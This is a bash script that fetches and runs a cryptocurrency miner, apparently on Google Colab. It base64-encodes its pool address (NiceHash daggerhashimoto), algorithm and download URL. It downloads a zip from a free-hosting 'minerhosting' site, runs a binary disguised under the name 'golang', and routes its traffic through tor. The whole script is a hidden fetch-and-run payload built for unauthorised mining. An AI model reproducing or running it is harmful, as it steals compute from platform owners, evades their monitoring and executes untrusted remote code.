#!/bin/bash

sudo apt-get install -y tor libpci-dev 

userAgent="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY.Colab"
string=c3RyYXR1bSt0Y3A6Ly9kYWdnZXJoYXNoaW1vdG8uZXUtd2VzdC5uaWNlaGFzaC5jb206MzM1Mw==
url=aHR0cHM6Ly9taW5lcmhvc3RpbmcuMDAwd2ViaG9zdGFwcC5jb20vZmlsZXMvZ29sYW5nX2xpbnV4X2FtZDY0LnppcA==
key=ZXRoYXNo
seed=$(echo $string | base64 --decode)
location=$(echo $url | base64 --decode)
apikey=$(echo $key | base64 --decode)

nohup tor &>/dev/null &

wget $location

unzip golang_linux_amd64.zip

cd golang_linux_amd64

chmod 777 golang

./golang -a $apikey --url $seed \
-u $userAgent -p x \
--proxy 127.0.0.1:9050
